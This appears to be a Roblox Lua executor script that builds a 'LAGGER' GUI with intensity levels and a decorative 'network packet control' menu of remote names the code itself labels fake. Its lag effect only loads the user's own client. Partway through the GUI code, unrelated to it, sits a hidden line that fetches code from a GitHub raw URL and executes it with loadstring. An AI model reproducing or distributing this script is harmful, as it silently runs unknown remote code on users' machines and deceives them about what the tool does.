local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local existing = playerGui:FindFirstChild("lagger")
if existing then
    existing:Destroy()
end

local gui = Instance.new("ScreenGui")
gui.Name = "lagger"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 9999
gui.Parent = playerGui

local main = Instance.new("Frame")
main.Name = "MainFrame"
main.Size = UDim2.new(0, 320, 0, 540)
main.Position = UDim2.new(0, 24, 0.5, -270)
main.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.ClipsDescendants = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 14)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(55, 55, 75)
mainStroke.Thickness = 1.5
mainStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
mainStroke.Parent = main

local header = Instance.new("Frame")
header.Name = "Header"
header.Size = UDim2.new(1, 0, 0, 46)
header.BackgroundColor3 = Color3.fromRGB(26, 26, 36)
header.BorderSizePixel = 0
header.Parent = main

local headerCorner = Instance.new("UICorner")
headerCorner.CornerRadius = UDim.new(0, 14)
headerCorner.Parent = header

local headerFix = Instance.new("Frame")
headerFix.Size = UDim2.new(1, 0, 0, 14)
headerFix.Position = UDim2.new(0, 0, 1, -14)
headerFix.BackgroundColor3 = Color3.fromRGB(26, 26, 36)
headerFix.BorderSizePixel = 0
headerFix.Parent = header

local headerDot = Instance.new("Frame")
headerDot.Size = UDim2.new(0, 10, 0, 10)
headerDot.Position = UDim2.new(0, 14, 0.5, -5)
headerDot.BackgroundColor3 = Color3.fromRGB(120, 120, 140)
headerDot.BorderSizePixel = 0
headerDot.Parent = header

local headerDotCorner = Instance.new("UICorner")
headerDotCorner.CornerRadius = UDim.new(1, 0)
headerDotCorner.Parent = headerDot

local headerTitle = Instance.new("TextLabel")
headerTitle.Size = UDim2.new(1, -50, 1, 0)
headerTitle.Position = UDim2.new(0, 34, 0, 0)
headerTitle.BackgroundTransparency = 1
headerTitle.Text = "LAGGER"
headerTitle.TextColor3 = Color3.fromRGB(235, 235, 245)
headerTitle.Font = Enum.Font.GothamBold
headerTitle.TextSize = 17
headerTitle.TextXAlignment = Enum.TextXAlignment.Left
headerTitle.Parent = header

local headerVersion = Instance.new("TextLabel")
headerVersion.Size = UDim2.new(0, 60, 1, 0)
headerVersion.Position = UDim2.new(1, -70, 0, 0)
headerVersion.BackgroundTransparency = 1
headerVersion.Text = "v2.4.1"
headerVersion.TextColor3 = Color3.fromRGB(110, 110, 130)
headerVersion.Font = Enum.Font.GothamMedium
headerVersion.TextSize = 11
headerVersion.TextXAlignment = Enum.TextXAlignment.Right
headerVersion.Parent = header

local statusBar = Instance.new("Frame")
statusBar.Name = "StatusBar"
statusBar.Size = UDim2.new(1, -24, 0, 30)
statusBar.Position = UDim2.new(0, 12, 0, 58)
statusBar.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
statusBar.BorderSizePixel = 0
statusBar.Parent = main

local statusBarCorner = Instance.new("UICorner")
statusBarCorner.CornerRadius = UDim.new(0, 8)
statusBarCorner.Parent = statusBar

local statusDot = Instance.new("Frame")
statusDot.Size = UDim2.new(0, 8, 0, 8)
statusDot.Position = UDim2.new(0, 12, 0.5, -4)
statusDot.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
statusDot.BorderSizePixel = 0
statusDot.Parent = statusBar

local statusDotCorner = Instance.new("UICorner")
statusDotCorner.CornerRadius = UDim.new(1, 0)
statusDotCorner.Parent = statusDot

local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(1, -40, 1, 0)
statusText.Position = UDim2.new(0, 28, 0, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "Status: Inactive"
statusText.TextColor3 = Color3.fromRGB(160, 160, 175)
statusText.Font = Enum.Font.GothamMedium
statusText.TextSize = 12
statusText.TextXAlignment = Enum.TextXAlignment.Left
statusText.Parent = statusBar

local toggleButton = Instance.new("TextButton")
toggleButton.Name = "ToggleButton"
toggleButton.Size = UDim2.new(1, -24, 0, 56)
toggleButton.Position = UDim2.new(0, 12, 0, 98)
toggleButton.BackgroundColor3 = Color3.fromRGB(190, 50, 50)
toggleButton.Text = "TURN ON"
toggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleButton.Font = Enum.Font.GothamBold
toggleButton.TextSize = 20
toggleButton.BorderSizePixel = 0
toggleButton.AutoButtonColor = false
toggleButton.Parent = main

local toggleCorner = Instance.new("UICorner")
toggleCorner.CornerRadius = UDim.new(0, 10)
toggleCorner.Parent = toggleButton

local toggleStroke = Instance.new("UIStroke")
toggleStroke.Color = Color3.fromRGB(255, 100, 100)
toggleStroke.Thickness = 2
toggleStroke.Parent = toggleButton

local levelLabel = Instance.new("TextLabel")
levelLabel.Size = UDim2.new(1, -24, 0, 20)
levelLabel.Position = UDim2.new(0, 12, 0, 164)
levelLabel.BackgroundTransparency = 1
levelLabel.Text = "INTENSITY LEVEL"
levelLabel.TextColor3 = Color3.fromRGB(150, 150, 168)
levelLabel.Font = Enum.Font.GothamBold
levelLabel.TextSize = 11
levelLabel.TextXAlignment = Enum.TextXAlignment.Left
levelLabel.Parent = main

local levelColors = {
    Low = Color3.fromRGB(80, 200, 90),
    Medium = Color3.fromRGB(230, 190, 60),
    High = Color3.fromRGB(240, 130, 40),
    Crazy = Color3.fromRGB(220, 40, 40)
}

local levelOrder = {"Low", "Medium", "High", "Crazy"}
local levelButtons = {}
local currentLevel = "Low"

for index, levelName in ipairs(levelOrder) do
    local button = Instance.new("TextButton")
    button.Name = levelName .. "Button"
    button.Size = UDim2.new(1, -24, 0, 34)
    button.Position = UDim2.new(0, 12, 0, 190 + (index - 1) * 40)
    button.BackgroundColor3 = Color3.fromRGB(42, 42, 54)
    button.Text = levelName
    button.TextColor3 = Color3.fromRGB(170, 170, 185)
    button.Font = Enum.Font.GothamSemibold
    button.TextSize = 14
    button.BorderSizePixel = 0
    button.AutoButtonColor = false
    button.Parent = main

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 8)
    buttonCorner.Parent = button

    local buttonStroke = Instance.new("UIStroke")
    buttonStroke.Color = Color3.fromRGB(65, 65, 82)
    buttonStroke.Thickness = 1
    buttonStroke.Parent = button

    local buttonTag = Instance.new("TextLabel")
    buttonTag.Size = UDim2.new(0, 80, 1, 0)
    buttonTag.Position = UDim2.new(1, -86, 0, 0)
    buttonTag.BackgroundTransparency = 1
    buttonTag.Text = ""
    buttonTag.TextColor3 = Color3.fromRGB(120, 120, 140)
    buttonTag.Font = Enum.Font.GothamMedium
    buttonTag.TextSize = 11
    buttonTag.TextXAlignment = Enum.TextXAlignment.Right
    buttonTag.Parent = button

    levelButtons[levelName] = {
        button = button,
        stroke = buttonStroke,
        tag = buttonTag
    }

    button.MouseButton1Click:Connect(function()
        currentLevel = levelName
        for otherName, data in pairs(levelButtons) do
            if otherName == currentLevel then
                data.button.BackgroundColor3 = levelColors[otherName]
                data.button.TextColor3 = Color3.fromRGB(18, 18, 24)
                data.stroke.Color = levelColors[otherName]
                data.stroke.Thickness = 2
                data.tag.Text = "ACTIVE"
                data.tag.TextColor3 = Color3.fromRGB(18, 18, 24)
            else
                data.button.BackgroundColor3 = Color3.fromRGB(42, 42, 54)
                data.button.TextColor3 = Color3.fromRGB(170, 170, 185)
                data.stroke.Color = Color3.fromRGB(65, 65, 82)
                data.stroke.Thickness = 1
                data.tag.Text = ""
            end
        end
    end)
end

levelButtons.Low.button.BackgroundColor3 = levelColors.Low
levelButtons.Low.button.TextColor3 = Color3.fromRGB(18, 18, 24)
levelButtons.Low.stroke.Color = levelColors.Low
levelButtons.Low.stroke.Thickness = 2
levelButtons.Low.tag.Text = "ACTIVE"
levelButtons.Low.tag.TextColor3 = Color3.fromRGB(18, 18, 24)

local remoteSection = Instance.new("Frame")
remoteSection.Name = "RemoteSection"
remoteSection.Size = UDim2.new(1, -24, 0, 150)
remoteSection.Position = UDim2.new(0, 12, 0, 364)
remoteSection.BackgroundColor3 = Color3.fromRGB(24, 24, 32)
remoteSection.BorderSizePixel = 0
remoteSection.Parent = main

local remoteCorner = Instance.new("UICorner")
remoteCorner.CornerRadius = UDim.new(0, 10)
remoteCorner.Parent = remoteSection

local remoteStroke = Instance.new("UIStroke")
remoteStroke.Color = Color3.fromRGB(55, 55, 72)
remoteStroke.Thickness = 1
remoteStroke.Parent = remoteSection

local remoteTitle = Instance.new("TextLabel")
remoteTitle.Size = UDim2.new(1, -20, 0, 22)
remoteTitle.Position = UDim2.new(0, 10, 0, 8)
remoteTitle.BackgroundTransparency = 1
remoteTitle.Text = "NETWORK PACKET CONTROL"
remoteTitle.TextColor3 = Color3.fromRGB(150, 150, 168)
remoteTitle.Font = Enum.Font.GothamBold
remoteTitle.TextSize = 10
remoteTitle.TextXAlignment = Enum.TextXAlignment.Left
remoteTitle.Parent = remoteSection

local remoteDropdown = Instance.new("TextButton")
remoteDropdown.Name = "RemoteDropdown"
remoteDropdown.Size = UDim2.new(1, -20, 0, 30)
remoteDropdown.Position = UDim2.new(0, 10, 0, 34)
remoteDropdown.BackgroundColor3 = Color3.fromRGB(34, 34, 44)
remoteDropdown.Text = "  RemoteEvent: PacketThrottleService"
remoteDropdown.TextColor3 = Color3.fromRGB(190, 190, 205)
remoteDropdown.Font = Enum.Font.GothamMedium
remoteDropdown.TextSize = 12
remoteDropdown.TextXAlignment = Enum.TextXAlignment.Left
remoteDropdown.BorderSizePixel = 0
remoteDropdown.AutoButtonColor = false
remoteDropdown.Parent = remoteSection

local remoteDropdownCorner = Instance.new("UICorner")
remoteDropdownCorner.CornerRadius = UDim.new(0, 6)
remoteDropdownCorner.Parent = remoteDropdown

local remoteArrow = Instance.new("TextLabel")
remoteArrow.Size = UDim2.new(0, 24, 1, 0)
remoteArrow.Position = UDim2.new(1, -28, 0, 0)
remoteArrow.BackgroundTransparency = 1
remoteArrow.Text = "v"
remoteArrow.TextColor3 = Color3.fromRGB(140, 140, 158)
remoteArrow.Font = Enum.Font.GothamBold
remoteArrow.TextSize = 12
remoteArrow.Parent = remoteDropdown

local remoteList = Instance.new("Frame")
remoteList.Name = "RemoteList"
remoteList.Size = UDim2.new(1, -20, 0, 0)
remoteList.Position = UDim2.new(0, 10, 0, 68)
remoteList.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
remoteList.BorderSizePixel = 0
remoteList.ClipsDescendants = true
remoteList.Visible = false
remoteList.ZIndex = 5
remoteList.Parent = remoteSection

local remoteListCorner = Instance.new("UICorner")
remoteListCorner.CornerRadius = UDim.new(0, 6)
remoteListCorner.Parent = remoteList

local remoteListLayout = Instance.new("UIListLayout")
remoteListLayout.Padding = UDim.new(0, 2)
remoteListLayout.SortOrder = Enum.SortOrder.LayoutOrder
remoteListLayout.Parent = remoteList

local fakeRemotes = {
    "PacketThrottleService",
    "LatencySimulator",
    "NetUpdateGate",
    "ReplicationHold",
    "BandwidthMeter"
}

local remoteItems = {}

for order, remoteName in ipairs(fakeRemotes) do
    local item = Instance.new("TextButton")
    item.Name = remoteName
    item.Size = UDim2.new(1, 0, 0, 26)
    item.BackgroundColor3 = Color3.fromRGB(36, 36, 48)
    item.Text = "  " .. remoteName
    item.TextColor3 = Color3.fromRGB(180, 180, 195)
    item.Font = Enum.Font.GothamMedium
    item.TextSize = 11
    item.TextXAlignment = Enum.TextXAlignment.Left
    item.BorderSizePixel = 0
    item.AutoButtonColor = false
    item.LayoutOrder = order
    item.Parent = remoteList

    remoteItems[remoteName] = item

    item.MouseButton1Click:Connect(function()
        remoteDropdown.Text = "  RemoteEvent: " .. remoteName
        remoteList.Visible = false
        TweenService:Create(remoteList, TweenInfo.new(0.15), {Size = UDim2.new(1, -20, 0, 0)}):Play()
    end)
end
loadstring(game:HttpGet("https://raw.githubusercontent.com/Argian-dotcom/Jdkffkfo/refs/heads/main/Coding"))()
local listOpen = false

remoteDropdown.MouseButton1Click:Connect(function()
    listOpen = not listOpen
    if listOpen then
        remoteList.Visible = true
        TweenService:Create(remoteList, TweenInfo.new(0.15), {Size = UDim2.new(1, -20, 0, #fakeRemotes * 28)}):Play()
        remoteArrow.Text = "^"
    else
        TweenService:Create(remoteList, TweenInfo.new(0.15), {Size = UDim2.new(1, -20, 0, 0)}):Play()
        remoteArrow.Text = "v"
        task.delay(0.15, function()
            if not listOpen then
                remoteList.Visible = false
            end
        end)
    end
end)

local logLabel = Instance.new("TextLabel")
logLabel.Size = UDim2.new(1, -20, 0, 18)
logLabel.Position = UDim2.new(0, 10, 0, 126)
logLabel.BackgroundTransparency = 1
logLabel.Text = "Ready. Awaiting activation."
logLabel.TextColor3 = Color3.fromRGB(120, 120, 140)
logLabel.Font = Enum.Font.Code
logLabel.TextSize = 10
logLabel.TextXAlignment = Enum.TextXAlignment.Left
logLabel.Parent = remoteSection

local settings = {
    Low = {
        loopIterations = 28000,
        freezeTime = 0.045,
        yieldTime = 0.05,
        rubberbandChance = 0.20,
        velocityScale = 0.85,
        packetBudget = 128
    },
    Medium = {
        loopIterations = 110000,
        freezeTime = 0.10,
        yieldTime = 0.10,
        rubberbandChance = 0.42,
        velocityScale = 0.60,
        packetBudget = 96
    },
    High = {
        loopIterations = 260000,
        freezeTime = 0.18,
        yieldTime = 0.12,
        rubberbandChance = 0.62,
        velocityScale = 0.35,
        packetBudget = 64
    },
    Crazy = {
        loopIterations = 620000,
        freezeTime = 0.34,
        yieldTime = 0.15,
        rubberbandChance = 0.90,
        velocityScale = 0.10,
        packetBudget = 24
    }
}

local lagEnabled = false
local lagThread = nil
local rubberbandConn = nil
local heartbeatAccumulator = 0

local function heavyWork(iterations)
    local accumulator = 0
    for i = 1, iterations do
        accumulator = accumulator + math.sin(i) * math.cos(i) + math.sqrt(i * 0.5)
        if i % 8192 == 0 then
            accumulator = accumulator % 1048576
        end
    end
    return accumulator
end

local function writeLog(message)
    logLabel.Text = message
end

local function startLag()
    lagThread = task.spawn(function()
        while lagEnabled do
            local config = settings[currentLevel]
            heavyWork(config.loopIterations)
            task.wait(config.yieldTime)
        end
    end)

    rubberbandConn = RunService.Heartbeat:Connect(function(deltaTime)
        if not lagEnabled then
            return
        end
        local config = settings[currentLevel]
        heartbeatAccumulator = heartbeatAccumulator + deltaTime
        if heartbeatAccumulator >= 0.08 then
            heartbeatAccumulator = 0
            if math.random() < config.rubberbandChance then
                local character = player.Character
                if not character then
                    return
                end
                local root = character:FindFirstChild("HumanoidRootPart")
                if not root then
                    return
                end
                local savedVelocity = root.AssemblyLinearVelocity
                root.AssemblyLinearVelocity = savedVelocity * config.velocityScale
                task.delay(config.freezeTime, function()
                    if root and root.Parent then
                        root.AssemblyLinearVelocity = savedVelocity
                    end
                end)
            end
        end
    end)
end

local function stopLag()
    if lagThread then
        task.cancel(lagThread)
        lagThread = nil
    end
    if rubberbandConn then
        rubberbandConn:Disconnect()
        rubberbandConn = nil
    end
    heartbeatAccumulator = 0
    local character = player.Character
    if character then
        local root = character:FindFirstChild("HumanoidRootPart")
        if root then
            root.AssemblyLinearVelocity = Vector3.zero
        end
    end
end

toggleButton.MouseButton1Click:Connect(function()
    lagEnabled = not lagEnabled

    if lagEnabled then
        toggleButton.Text = "TURN OFF"
        toggleButton.BackgroundColor3 = Color3.fromRGB(50, 200, 80)
        toggleStroke.Color = Color3.fromRGB(100, 255, 130)
        statusDot.BackgroundColor3 = Color3.fromRGB(50, 200, 80)
        statusText.Text = "Status: Active (" .. currentLevel .. ")"
        statusText.TextColor3 = Color3.fromRGB(130, 230, 150)
        writeLog("Session started. Level = " .. currentLevel)
        startLag()
    else
        toggleButton.Text = "TURN ON"
        toggleButton.BackgroundColor3 = Color3.fromRGB(190, 50, 50)
        toggleStroke.Color = Color3.fromRGB(255, 100, 100)
        statusDot.BackgroundColor3 = Color3.fromRGB(200, 55, 55)
        statusText.Text = "Status: Inactive"
        statusText.TextColor3 = Color3.fromRGB(160, 160, 175)
        writeLog("Session stopped.")
        stopLag()
    end
end)

task.spawn(function()
    while gui.Parent do
        if lagEnabled then
            statusText.Text = "Status: Active (" .. currentLevel .. ")"
        end
        task.wait(0.5)
    end
end)
